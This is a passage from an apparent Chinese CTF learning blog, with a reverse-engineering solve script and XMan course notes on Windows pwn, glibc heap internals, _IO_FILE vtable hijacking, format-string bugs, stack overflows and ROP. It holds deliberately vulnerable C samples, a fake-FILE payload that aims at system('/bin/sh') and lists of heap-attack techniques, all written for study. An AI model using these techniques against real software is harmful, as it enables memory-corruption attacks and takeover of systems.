*)v9 + 3) + *(_DWORD *)&amp;v8[j + 24] * *((_DWORD *)v9 + 4) + *(_DWORD *)&amp;v8[j + 48] * *((_DWORD *)v9 + 5); j += 4LL; &#125; while ( j != 24 ); if ( ++i == 6 ) break; v5 = *(char **)&amp;v4[8 * i]; &#125; return v4;&#125; 那么这个过程用numpy就能解出来，解题脚本： 12345678910111213141516171819202122232425from numpy import *enc = [ 0x0004E36B, 0x000362D6, 0x0003D5F1, 0x00063C4C, 0x00066AF7, 0x000418B7, 0x0004BE2E, 0x00035571, 0x0003DA7F, 0x00060D4A, 0x0006423A, 0x0003FC18, 0x0003A3B6, 0x0002FBEE, 0x00038F5B, 0x000509E4, 0x00057DAE, 0x00037D25, 0x0002E69A, 0x00028B2A, 0x000363B1, 0x00041DAE, 0x00049FA8, 0x0002D536, 0x0003B440, 0x00028D5B, 0x0003AF48, 0x00051F80, 0x00059294, 0x00030E5F, 0x00047CF0, 0x00034F47, 0x00033520, 0x000547A8, 0x000581E0, 0x0003E875]data = [ 0x00000106, 0x00000245, 0x0000009C, 0x000001E2, 0x00000224, 0x0000027A, 0x00000112, 0x000000AE, 0x00000323, 0x000003C4, 0x00000370, 0x000000DC, 0x00000387, 0x0000001E, 0x000000B6, 0x000003D8, 0x0000035D, 0x0000013A, 0x000002B9, 0x00000162, 0x00000083, 0x00000225, 0x00000057, 0x0000018C, 0x00000109, 0x0000021B, 0x00000319, 0x000000EE, 0x000002C1, 0x000001D5, 0x0000023A, 0x0000019A, 0x00000145, 0x0000025E, 0x0000032A, 0x000001D6]trans_data = mat(data).reshape(6, 6)trans_enc = mat(enc).reshape(6, 6)trans = trans_enc * trans_data.Ires = trans.T.reshape(1, 36).tolist()[0]flag = ''for ch in res: flag += chr(int(round(ch)))print(flag) 因为还没学过线代，还没看懂的时候，硬生生现学现用z3把矩阵求逆的过程解出来了，所以顺便贴一波现学的z3脚本： 123456789101112131415161718192021222324from z3 import *enc = [0x0004E36B, 0x000362D6, 0x0003D5F1, 0x00063C4C, 0x00066AF7, 0x000418B7, 0x0004BE2E, 0x00035571, 0x0003DA7F, 0x00060D4A, 0x0006423A, 0x0003FC18, 0x0003A3B6, 0x0002FBEE, 0x00038F5B, 0x000509E4, 0x00057DAE, 0x00037D25, 0x0002E69A, 0x00028B2A, 0x000363B1, 0x00041DAE, 0x00049FA8, 0x0002D536, 0x0003B440, 0x00028D5B, 0x0003AF48, 0x00051F80, 0x00059294, 0x00030E5F, 0x00047CF0, 0x00034F47, 0x00033520, 0x000547A8, 0x000581E0, 0x0003E875]data = [0x00000106, 0x00000245, 0x0000009C, 0x000001E2, 0x00000224, 0x0000027A, 0x00000112, 0x000000AE, 0x00000323, 0x000003C4, 0x00000370, 0x000000DC, 0x00000387, 0x0000001E, 0x000000B6, 0x000003D8, 0x0000035D, 0x0000013A, 0x000002B9, 0x00000162, 0x00000083, 0x00000225, 0x00000057, 0x0000018C, 0x00000109, 0x0000021B, 0x00000319, 0x000000EE, 0x000002C1, 0x000001D5, 0x0000023A, 0x0000019A, 0x00000145, 0x0000025E, 0x0000032A, 0x000001D6]i = 0res = ''while(1): s = Solver() n0 = Int('n0') n1 = Int('n1') n2 = Int('n2') n3 = Int('n3') n4 = Int('n4') n5 = Int('n5') s.add(enc[i * 6 + 0] == n0 * data[0] + n1 * data[6] + n2 * data[12] + n3 * data[18] + n4 * data[24] + n5 * data[30]) s.add(enc[i * 6 + 1] == n0 * data[1] + n1 * data[7] + n2 * data[13] + n3 * data[19] + n4 * data[25] + n5 * data[31]) s.add(enc[i * 6 + 2] == n0 * data[2] + n1 * data[8] + n2 * data[14] + n3 * data[20] + n4 * data[26] + n5 * data[32]) s.add(enc[i * 6 + 3] == n0 * data[3] + n1 * data[9] + n2 * data[15] + n3 * data[21] + n4 * data[27] + n5 * data[33]) s.add(enc[i * 6 + 4] == n0 * data[4] + n1 * data[10] + n2 * data[16] + n3 * data[22] + n4 * data[28] + n5 * data[34]) s.add(enc[i * 6 + 5] == n0 * data[5] + n1 * data[11] + n2 * data[17] + n3 * data[23] + n4 * data[29] + n5 * data[35]) s.check() print s.model() if i == 5: break i += 1 参考网站http://yugod.xmutsec.com/index.php/2018/08/10/42.htmlhttps://www.jianshu.com/p/028c0c6270c3https://github.com/krx/CTF-Writeups/tree/master/CSAW%2016%20Quals/for150%20-%20Yaar%20Haar%20Fiddle%20Dee%20Deehttps://www.xctf.org.cn/library/details/9ab7dca891b9e53206b9aec7ab13ac9a95fbf66d/?from=groupmessage&amp;isappinstalled=0https://www.jianshu.com/p/110f715c210f","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"review","slug":"review","permalink":"https://qianfei11.github.io/tags/review/"}]},{"title":"XMan PWN（五）","slug":"XMan-PWN（五）","date":"2018-08-09T01:08:59.000Z","updated":"2019-03-01T11:47:47.118Z","comments":true,"path":"2018/08/09/XMan-PWN（五）/","link":"","permalink":"https://qianfei11.github.io/2018/08/09/XMan-PWN（五）/","excerpt":"swing大佬教漏洞挖掘（Vulnerability Discovering）。","text":"swing大佬教漏洞挖掘（Vulnerability Discovering）。 Data-Flow Analysis数据流分析指的是一组用来获取有关数据如何沿着程序执行路径流动的相关信息的技术。 数据流分析的目的是提供一个过程（或一大段程序）如何操纵器数据的全局信息。 根据对程序路径的分析精度分类 流不敏感分析（flow insensitive）：不考虑语句的先后顺序，按照程序语句的物理位置从上往下顺序分析每一语句 流敏感分析（flow sensitive）：考虑程序语句可能的执行顺序，通常需要利用程序的控制流图（CFG） 路径敏感分析（path sensitive）：不仅考虑语句的先后顺序，还对程序执行路径条件加以判断，以确定分析使用的语句序列是否对应着一条可实际运行的程序执行路径 根据分析路径的深度分类 过程内分析（intraprocedure analysis）：指针对程序中函数内的代码 过程间分析（inter-procedure analysis）：考虑函数之间的数据流，即需要跟踪分析目标数据在函数之间的传递过程 漏洞审计由于一些程序漏洞的特征可以表现为特定程序变量在特定的程序点上的性质、状态或取值不满足程序安全的规定，因此数据流分析可以直接用于检测这些漏洞 漏洞分析规则程序漏洞通常和程序中变量的状态或者变量的取值相关。状态自动机可以描述和程序变量状态相关的漏洞分析规则，自动机的状态和变量相应的状态对应。和变量取值相关的检测规则通常包含和程序语句或者指令相关的对变量取值的记录规则以及在特定情况下变量取值需要满足的约束条件。 Symbolic ExecutionA system walks through all possible paths of a program. AngrPinFuzzingetc","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"XMan PWN（四）","slug":"XMan-PWN（四）","date":"2018-08-08T06:17:21.000Z","updated":"2019-03-01T11:48:06.341Z","comments":true,"path":"2018/08/08/XMan-PWN（四）/","link":"","permalink":"https://qianfei11.github.io/2018/08/08/XMan-PWN（四）/","excerpt":"NONICK师傅神仙上课，win下的pwn是真的难。","text":"NONICK师傅神仙上课，win下的pwn是真的难。 BasicsSome Tools IDA Pro X64 DBG WinDBG Mona PE Format PE Header IAT（Import Address Table） EAT（Export Address Table） Section Table PE Memory Layout Basic DLLS NTDLL.DLL Kernel32.dll User32.dll Msvcrtxxx.dll Common vulnerability123456789101112void *GetInput(char *out)&#123; char *p = (char *)malloc(0x20); DWORD readed = 0; HANDLE hin = GetStdHandle(STD_INPUT_HANDLE); // Heap overflow ReadFile(hin, p, 0x200, &amp;readed, 0); // Stack overflow memcpy(out, p, readed); // Generate an exception free(p);&#125; Stack Overflow SEHOnly in x86, it sucks in x64. https://www.52pojie.cn/thread-630505-1-1.html Heap Overflow Mitigation: Encoded function pointer, block header, subsegment header. Low fragment heap(LFH), randomize all heap allocation, enabled by default. Guard pages. Other vulnerabilitiesLFH Bypass Alloc within 18 times Alloc size &gt; 16k Heap spray Low fragment heap Use-After-Free in a nutshell123456789101112131415161718192021222324252627while(true)&#123; if(cn) cn-&gt;hi(); // use-after-free switch(menu()) &#123; case 1: &#123; cn = new CName(tmpname); break; &#125; case 2: &#123; if(cn) delete cn; // double free break; &#125; case 3: &#123; char *comment = new char[72]; cin.getline(comment, 72); break; &#125; default: ExitProcess(0); &#125;&#125; Crash-After-Usepwn the vtable Mitigation &amp; BypassASLR &amp; DEP ASLR Software DEP Hardware DEp SafeSEH &amp; SEHOP SEHOP Bypass method 1: Somehow leak the pointer at stack Bypass method 2: If program doesn’t use ASLR, just copy the stack address CFG ntdll - NtContinue Exploit non-CFG module Overwrite Guard CF Check Function Pointer Real vulnerabilityCVE-2017-11882","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"XMan PWN（三）","slug":"【未完成】XMan-PWN（三）","date":"2018-08-07T00:55:00.000Z","updated":"2019-03-03T09:16:47.345Z","comments":true,"path":"2018/08/07/【未完成】XMan-PWN（三）/","link":"","permalink":"https://qianfei11.github.io/2018/08/07/【未完成】XMan-PWN（三）/","excerpt":"lowkey师傅教_IO_FILE利用。","text":"lowkey师傅教_IO_FILE利用。 还是要好好看glibc源码，这里最重要的是/libio/libio.h。 WHAT is _IO_FILE123456789101112131415161718192021222324252627282930313233343536373839404142struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; _IO_FILE structures All the FILE structures will be linked in a linked list The head is the _IO_LIST_ALL, we can go through all the FILE structures with this linked list head Three FILE structures will be opened automatically stdin, stdout, stderr saved in the rw- section of libc in the memory struct _IO_FILE *_chain _IO_FILE_plus structures12345struct _IO_FILE_plus&#123; FILE file; const struct _IO_jump_t *vtable;&#125;; vtable is a _IO_jump_t pointer, some std I/O functions will use these pointers. fread fwrite fopen fclose printf/puts fread1234567891011121314151617_IO_size_t_IO_fread (buf, size, count, fp) void *buf; _IO_size_t size; _IO_size_t count; _IO_FILE *fp;&#123; _IO_size_t bytes_requested = size * count; _IO_size_t bytes_read; CHECK_FILE (fp, 0); if (bytes_requested == 0) return 0; _IO_acquire_lock (fp); bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested); _IO_release_lock (fp); return bytes_requested == bytes_read ? count : bytes_read / size;&#125; buffer =&gt; save data size =&gt; size of each object count =&gt; how many objects stream =&gt; file stream return value =&gt; readed objects fwrite12345678910111213141516171819202122232425_IO_size_t_IO_fwrite (buf, size, count, fp) const void *buf; _IO_size_t size; _IO_size_t count; _IO_FILE *fp;&#123; _IO_size_t request = size * count; _IO_size_t written = 0; CHECK_FILE (fp, 0); if (request == 0) return 0; _IO_acquire_lock (fp); if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1) written = _IO_sputn (fp, (const char *) buf, request); _IO_release_lock (fp); /* We have written all of the input in case the return value indicates this or EOF is returned. The latter is a special case where we simply did not manage to flush the buffer. But the data is in the buffer and therefore written as far as fwrite is concerned. */ if (written == request || written == EOF) return count; else return written / size;&#125; buffer =&gt; write data size =&gt; size of each object counts =&gt; num of objects stream =&gt; file stream pointer return value =&gt; num of written objects fopen123456/* Open a file and create a new stream for it. This function is a possible cancellation point and therefore not marked with __THROW. */extern FILE *fopen (const char *__restrict __filename, const char *__restrict __modes) __wur; filename =&gt; target file type =&gt; open type(r/w/x) return value =&gt; file pointer fclose12345/* Close STREAM. This function is a possible cancellation point and therefore not marked with __THROW. */extern int fclose (FILE *__stream); Close a file stream, output the rest of data in the buffer area to the drive unlink the fp from the linked list call _IO_file_close_it to close the fp _IO_FINISH(fp) printf/puts1234567891011121314151617int_IO_puts (str) const char *str;&#123; int result = EOF; _IO_size_t len = strlen (str); _IO_acquire_lock (_IO_stdout); if ((_IO_vtable_offset (_IO_stdout) != 0 || _IO_fwide (_IO_stdout, -1) == -1) &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len &amp;&amp; _IO_putc_unlocked ('\\n', _IO_stdout) != EOF) result = MIN (INT_MAX, len + 1); _IO_release_lock (_IO_stdout); return result;&#125; _IO_puts _IO_sputn _IO_new_file_xsputn write Exploit123456789101112#32 bitsfake_file = \"/bin/sh\\x00\" + \"\\x00\" * 0x40 + p32(fake_lock_addr)fake_file = fake_file.ljust(0x94, \"\\x00\")fake_file += p32(fake_vtable_addr - 0x44)#64 bitsfake_file = \"/bin/sh\\x00\" + '\\x00' * 0x8fake_file += p64(system) + '\\x00' * 0x70# the system can also be placed in other memoryfake_file += p64(fake_lock_addr)fake_file = fake_file.ljust(0xd8, '\\x00')fake_file += p64(buf_addr + 0x10 - 0x88) # fake_vtable_addr SOME challengesexample1","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"XMan PWN（二）","slug":"XMan-PWN（二）","date":"2018-08-06T02:53:04.000Z","updated":"2019-03-01T11:47:35.260Z","comments":true,"path":"2018/08/06/XMan-PWN（二）/","link":"","permalink":"https://qianfei11.github.io/2018/08/06/XMan-PWN（二）/","excerpt":"toxic小姐姐讲的很好，是我太菜了。","text":"toxic小姐姐讲的很好，是我太菜了。 堆这一块需要对glibc源码中/malloc/malloc.c有一定的熟悉。 linux堆管理基础 一块内存 几种数据结构 一些安全机制 动态分配和回收 提高利用率 减少碎片化 heap allocator管理堆的分配和回收 减少系统调用次数 提高效率 ptmalloc2 - glibc主要结构：chunk、bin、arena bins管理空闲堆块 arena记录分配信息 chunk heap基本组成是chunk Allocated chunk/Free chunk 123456789101112struct malloc_chunk &#123; INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; allocated chunkchunk size：包含了堆头部 由于对齐问题，size低3位恒为0，用作标识位： N：1/0，当前chunk是否为thread arena M：1/0，是否mmaped分配 P：1/0，前一个chunk是否使用中 prev_size：前一个相邻块大小 前一个块free时有意义 前一个块allocated时可以空间复用为数据空间 free chunk fd：指向freelist中的下一个块 bk：指向freelist中的上一个块 fd_nextsize：指向freelist中的下一个large chunk bk_nextsize：指向freelist中的上一个large chunk PS：fd_nextsize和bk_nextsize只能在large bin chunk中使用。 top chunk第一个malloc完成时，top chunk就存在了。 之后如果所有的bins都不能满足分配需求，则从top chunk中切出一块返回，剩下的块则为新的top chunk。 bins用来管理空间块 - 链表结构 不同大小的free chunk属于不同的bin。 fast bins unsorted bin small bins large bins fast bins管理free fast bin chunk - 单链表结构 - FILO 总共有10个bins，每个bin中chunk大小一样，范围：0x20～0x80（64bit），0x10递增。 仍被标记为pre inuse位，不会进行合并。 实际上最后3个并不使用。 unsorted bin管理unsorted chunk - 双向循环链表 - FIFO 只有一个bin，bin中chunk大小不一样 除fast chunk之外的chunk被free时都会先放进unsorted bin，类似于缓存 small bin管理small chunk - 双向循环链表 - FIFO 共62个bins，每个bin中chunk大小一样，范围：0x20～0x400（64bit），0x10递增。 large bin管理large chunk - 双向循环链表 - FIFO 共63个bins，同一个bin中的chunk大小可以不一样，但在某个范围内（大于0x400（64bit）），按照从大到小排列。 arena用于管理bins main_arena：由主线程创建thread_arena：由其他线程创建 arena数量有限： x86：2 * cores + 1 x64：8 * cores + 1 对应的数据结构 - malloc_state 12345678910111213141516171819202122232425262728293031323334353637383940414243struct malloc_state&#123; /* Serialize access. */ __libc_lock_define (, mutex); /* Flags (formerly in max_fast). */ int flags; /* Set if the fastbin chunks contain recently inserted free blocks. */ /* Note this is a bool but not all targets support atomics on booleans. */ int have_fastchunks; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; mutex：用于多线程支持 flagd：用于标识该arena的性质 fastbinsY[NFASTBINS]：fastbin指针数组 top：指向top chunk的指针 Bins[NBINS * 2 - 2]：bins数组指针 *next：指向下一个arena，构成一个循环单向列表 *next_free：指向idle arena，便于线程快速匹配 what glibc do when malloc 计算真正的堆块大小（用户申请 + 堆头 =&gt; 对齐） 是否在fast bin范围内 是 =&gt; 检查对应的bin是否有chunk 是 =&gt; 从bin中取下chunk返回给程序，完成 是否在small bin范围内 是 =&gt; 检查对应的bin是否有chunk 是 =&gt; 从bin中取下chunk返回给程序，完成 unsorted bin里是否有chunk 有 =&gt; 从尾部取出第一个chunk，大小是否满足分配需求 是 =&gt; 剩余大小是否大于MINSIZE 是 =&gt; 切分块，返回给用户，把剩余的块放入unsorted bin，完成 否 =&gt; 从unsorted bin中取下该块并返回，完成 无 =&gt; 把这个块放到对应的small/large bins，遍历下一块 是否在large bin范围内 是 =&gt; 检查对应的bin是否有chunk 有 =&gt; 找到满足需求的最小的chunk，切分块并返回，把剩余的块放入unsorted bin，完成 再次浏览所有的small/large bins来找到best-fit的chunk 使用top chunk 系统调用扩大堆空间 what glibc do when free free的chunk大小是否属于fast bin 是 =&gt; 直接链入对应的fast bin中，不改变下一堆块的prev inuse标志位 是否通过mmapped分配 是 =&gt; 用munmap回收 前一个相邻的chunk是否空闲 是 =&gt; 和前一个堆块合并 后一个相邻chunk是否是top chunk 是 =&gt; 和top chunk合并 后一个相邻的chunk是否空闲 是 =&gt; 和后一个块合并 链入unsorted bin 常见堆漏洞chunk overflow 修改下一个堆块的size、标志位、fd/bk指针等 修改下一个堆块的用户数据、eg指针等 use after free一个内存快被释放后再次使用。 释放后指针没有被置为NULL 内存数据没有被清理 double free UAF（use after free）的一个特例 把已经free过的块再free一次 需要绕过glibc中对于double free的检查： 1234567891011121314151617181920if (SINGLE_THREAD_P) &#123; /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) malloc_printerr (\"double free or corruption (fasttop)\"); p-&gt;fd = old; *fb = p; &#125; else do &#123; /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) malloc_printerr (\"double free or corruption (fasttop)\"); p-&gt;fd = old2 = old; &#125; while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); unlinkfree chunk的时候堆块前向、后向合并，将使用unlink。 1234567891011121314151617181920212223242526272829303132/* Take a chunk off a bin list */#define unlink(AV, P, BK, FD) &#123; \\ if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\"corrupted size vs. prev_size\"); \\ FD = P-&gt;fd; \\ BK = P-&gt;bk; \\ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (\"corrupted double-linked list\"); \\ else &#123; \\ FD-&gt;bk = BK; \\ BK-&gt;fd = FD; \\ if (!in_smallbin_range (chunksize_nomask (P)) \\ &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; \\ if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) \\ || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) \\ malloc_printerr (\"corrupted double-linked list (not small)\"); \\ if (FD-&gt;fd_nextsize == NULL) &#123; \\ if (P-&gt;fd_nextsize == P) \\ FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \\ else &#123; \\ FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \\ &#125; \\ &#125; else &#123; \\ P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ &#125; \\ &#125; \\ &#125; \\&#125; 现在对unlink也有检查： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556 /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) &#123; bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)) malloc_printerr (\"malloc(): smallbin double linked list corrupted\"); set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; if (av != &amp;main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; off by one只能溢出一个字节。 改写下一个块的size 改写下一个块的prev inuse位 =&gt; unlink=&gt; chunk overlap CTF中堆的常见攻击手法fast bin attack控制fd指针 UAF：directly corrupted fd Double free：fast bin dup Size检查：链表中第一个chunk是否和要free的chunk相同 利用misalignment伪造size =&gt; 0x7fXXXXXXXXXXX Overwrite GOT Overwrite main_arena（always top chunk ptr） Overwrite realloc_hook/malloc_hook/free_hook（but always infeasible） unsorted bin attack任意地址写固定值 控制bk指针、bk = addr - 0x10（64bit） malloc一个大小正好的堆块 - 最终达到addr = main_arena + 0x58 通常改写global_max_fast small bin attack 伪造fake chunk，让其指针指向victim 改写victim的bk为fake chunk 把fake chunk放入对应的small bin中 下次malloc可以分配到fake chunk处 large bin attack出现在unsorted bin放入large bin的过程中 把large chunk的bk_nextsize指针改写成addr_a 通过malloc把一个比当前chunk（victim）小的块放入large bin中 addr_a + 0x20将被改写成victim指针 House of XXXInclude： House of Spirit House of Force House of Lore House of Einherjar House of Orange House of Roman House of Spiritfast bin sttack fake a bin chunk 改写fast bin chunk的fd指针，让其指向fake chunk malloc两次，可以分配到fake chunk House of Forcetop chunk attack Overwrite top chunk’s size Malloc arbitrary size Can malloc twice Loresmall bin sttack 改写small bin chunk的bk指针，让其指向fake chunk 需要满足bck-&gt;fd==victim的检查，也就是fake chunk的指针指向被改写的small bin chunk Einherjaroff by one Fake chunk, fake pre_size Off by null clear next chunk’s pre_in_use bit Could free not fasts bins Orange 伪造的size必须要对齐到内存页 size要大于MINSIZE（0x10） size要小于之后申请的chunk size + MINSIZE size的prev inuse位必须为1 Romanfast bin attack + unsorted bin attack 没有泄漏 Partial write to bypass ASLR tricks 改got（atoi、free） free_hook改system malloc_hook改onegadget 利用malloc_printerer实现one_gadget 利用misalignment伪造size 利用fast bin attack在main arena写size 利用fast bin attack改写top chunk ptr summary 改写关键数据结构 跳出heap范围 构造overlap chunk","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"XMan PWN（一）","slug":"XMan-PWN（一）","date":"2018-08-05T03:33:27.000Z","updated":"2019-03-01T11:47:05.746Z","comments":true,"path":"2018/08/05/XMan-PWN（一）/","link":"","permalink":"https://qianfei11.github.io/2018/08/05/XMan-PWN（一）/","excerpt":"丁佬tql，我完全pwn不起来。","text":"丁佬tql，我完全pwn不起来。 因为自己基础不太好，跟着ctf wiki学习一些基础的知识作为补充。 调用约定 x86: stack x64: rdi, rsi, rdx, rcx, r8, r9, stack 系统调用 x86: eax - syscall =&gt; ebx, ecx, edx x64: rax - syscall =&gt; rdi, rsi, rdx, rcx, r8, r9 格式化字符串漏洞格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的C/C++程序都会利用格式化字符串函数来输出信息，调试程序，或者处理字符串。一般来说，格式化字符串在利用的时候主要分为三个部分 格式化字符串函数 格式化字符串 后续参数，可选 格式化字符串函数输入 scanf 输出 printf：输出到stdout fprintf：输出到指定FILE流 vprintf：根据参数列表格式化输出到 stdout vfprintf：根据参数列表格式化输出到指定FILE流 sprintf：输出到字符串 snprintf：输出指定字节数到字符串 vsprintf：根据参数列表格式化输出到字符串 vsnprintf：根据参数列表格式化输出指定字节到字符串 setproctitle：设置argv syslog：输出日志 err、verr、warn、vwarn等 格式化字符串格式 %d - 十进制 - 输出十进制整数 %s - 字符串 - 从内存中读取字符串 %x - 十六进制 - 输出十六进制数 %c - 字符 - 输出字符 %p - 指针 - 指针地址 %n - 到目前为止所写的字符数 格式化字符串利用 程序崩溃 泄漏内存 覆盖内存 小技巧 利用%x来获取对应栈的内存，但建议使用%p，可以不用考虑位数的区别。 利用%s来获取变量所对应地址的内容，只不过有零截断。 利用%order$x来获取指定参数的值，利用%order$s来获取指定参数对应地址的内容。 栈溢出漏洞栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是： 程序必须向栈上写入数据。 写入的数据大小没有被良好地控制。 32位与64位程序的区别： x86：函数参数在函数返回地址的上方 x64：System V AMD64 ABI (Linux、FreeBSD、macOS 等采用)中前六个整型或指针参数依次保存在RDI、 RSI、RDX、RCX、R8和R9寄存器中，如果还有更多的参数的话才会保存在栈上；内存地址不能大于 0x00007FFFFFFFFFFF，6个字节长度，否则会抛出异常。 寻找危险函数通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下 输入 gets，直接读取一行，忽略’\\x00’ scanf vscanf 输出 sprintf 字符串 strcpy，字符串复制，遇到’\\x00’停止 strcat，字符串拼接，遇到’\\x00’停止 bcopy 确定填充长度这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式 相对于栈基地址的的索引，可以直接通过查看EBP相对偏移获得 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。 直接地址索引，就相当于直接给定了地址。 一般来说，我们会有如下的覆盖需求： 覆盖函数返回地址，这时候就是直接看EBP即可。 覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。 覆盖bss段某个变量的内容。 根据现实执行情况，覆盖特定的变量或地址的内容。 之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。 基本ROP随着NX保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓gadgets就是以ret结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。 之所以称之为ROP，是因为核心在于利用了指令集中的ret指令，改变了指令流的执行顺序。ROP攻击一般得满足如下条件： 程序存在溢出，并且可以控制返回地址。 可以找到满足条件的gadgets以及相应gadgets的地址。 如果gadgets每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。 